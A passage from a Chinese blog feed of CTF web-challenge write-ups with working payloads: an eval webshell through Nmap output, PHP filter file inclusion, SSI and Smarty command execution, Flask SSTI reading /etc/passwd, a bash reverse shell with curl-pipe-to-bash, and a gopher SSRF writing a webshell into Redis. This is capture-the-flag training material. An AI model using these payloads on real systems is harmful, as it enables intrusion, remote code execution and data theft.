关闭JS，抓包得到一段JS代码，验证无法绕过，直接访问flag.php，修改X-Forwarded-For头，得到flag。</p><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>​    Nmap -oG 将报告保存到文件中payload,短标签，phtml绕过WAF:<code>&#39; &lt;?= @eval($_POST[&quot;aa&quot;]);?&gt; -oG aa.phtml &#39;</code>。</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>​    在category出随便输入获得include报错，使用include特性尝试包含一波flag.php</p><p>​    <code>woofers/../flag</code>,发现flag.php存在，尝试使用PHP://filter伪协议读取一波源码，发现category被限制了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    使用filter<a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">伪协议特点</a>，可以添加一层无用的筛选列表绕过WAF。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/woofers/resource=flag</span><br></pre></td></tr></table></figure><p>##[WUSTCTF2020]朴实无华</p><p>robots.txt可找到源码，第一关intval绕过<code>1e10</code>，第二关弱类型md5，要求加密前和加密后都以0e开头而且后面都是数字，爆破看脸，网上payload<code>0e215962017</code>，第三关使用linux特殊环境变量内部字段分隔符（internal field separator） ${IFS}绕过空格。</p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>index.php.swp找到源码，SSI注入，首先找flag<code>&lt;!--#exec cmd=&quot;find / -name fla*&quot;--&gt;</code></p><p><code>&lt;!--#exec cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code></p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>​    随机数种子爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="comment">#字典</span></span><br><span class="line">str2=<span class="string">'U0Ssf69rN4'</span><span class="comment">#密文</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><p>​    下载<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">爆破工具</a> ，进入目录make一下。</p><p>​    <img src="https://i.loli.net/2020/09/16/R1lP9QCJOTpxGAb.png" alt></p><p> 在相应环境（PHP 7.1.0+）下生成payload。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">503734369</span>);</span><br><span class="line"></span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>​    一道flask SSTI，通过模板注入找到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/etc/passwd&apos;,&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>过滤了很多函数，但是可以通过字符串拼接绕过，读取flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>打开网站发现要素：build with smarty，应该是一道smarty模板注入，注入点在XFF头。</p><p><code>{$smarty.version}</code>发现smarty版本是3.1.30，查看对应版本的官方文档，发现任意函数执行漏洞。</p><p>{if 任意函数执行}{/if}。</p><p><code>payload={if system(&#39;cat /flag&#39;)}{/if}</code></p><h2 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h2><p>vim -r修复文件得到源码，exec无回显，基本上是弹shell了，在服务器部署一个bash脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip/bash脚本名 | bash</span><br></pre></td></tr></table></figure><p>反弹shell成功，使用<code>find / -name &quot;flag&quot;</code>，找到flag</p><h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p>有一个输入url的地方，查看界面源码发现secret，暴露出内网IP</p><p><img src="https://i.loli.net/2020/09/30/3jMRJXl1xnrC5Gg.png" alt></p><p>，利用http扫一波内网地址，发现在173.109.229.12存在某个服务，扫一波端口，发现是Redis服务，题目过滤了dict协议，但是没有过滤gopher协议，修改一下脚本，直接一发打过去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://173.109.229.12:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20/flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure><p>在url处输入<code>http://173.109.229.12/shell.php</code>得到flag。</p><h2 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h2><p>打开界面源码发现可疑十六进制数据，转换之后是Po???,网上搜了一下发现是元素周期表！！！，不愧是元素大师题</p><p>按元素周期表中的元素.php依次访问(脚本)，得到<code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code>，访问得到flag。</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>第一关字符串解析绕过，PHP会将变量中含有[.等非法字符转换成_，利用b.p.u.t绕过，用换行符%0a绕过美元符正则，进入第二关。</p><p>一堆jsfuck，丢入控制台，得到参数Merak ,POST传入Merak 得到源码，限制ip在127.0.0.1，PHP对于IP的处理通常是首先判断是否存在Client-ip,然后判断是否存在X-Forwarded-For，最后判断Remote_attr，在这里在报文头部加上client-ip: 127.0.0.1可以直接绕过,然后file参数是一段很简单的逆运算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$a=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)</span><br><span class="line">&#123;</span><br><span class="line">$flag.=chr(ord($a[$i])-$i*<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后用php://input绕过一下2333参数得到flag。</p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>要求用json格式输入命令<code>{&quot;cmd&quot;:&quot;ls&quot;}</code>,得到index.php但是不能读取。然后百度一下，他们都说<a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">先知</a>可以拿到源码，发现正则使用的是preg_match，可以使用多行绕过。</p><p>多行绕过</p><p>源码中通过putenv设置了PATH环境变量，PATH环境变量存放的是命令搜索路径，所以只能通过绝对路径拿到命令，/bin/cat。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=&#123;%0A&quot;cmd&quot;:%20&quot;/bin/cat%20/home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;checkin&quot;&gt;&lt;a href=&quot;#checkin&quot; class=&quot;headerlink&quot; title=&quot;checkin&quot;&gt;&lt;/a&gt;checkin&lt;/h1&gt;&lt;p&gt;​    是一道文件上传题，首先抓包分析一波，发现&amp;lt;?,php,等都不行，直接上传基本凉凉，于</summary>
      
    
    
    
    <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
  </entry>
  
</feed>
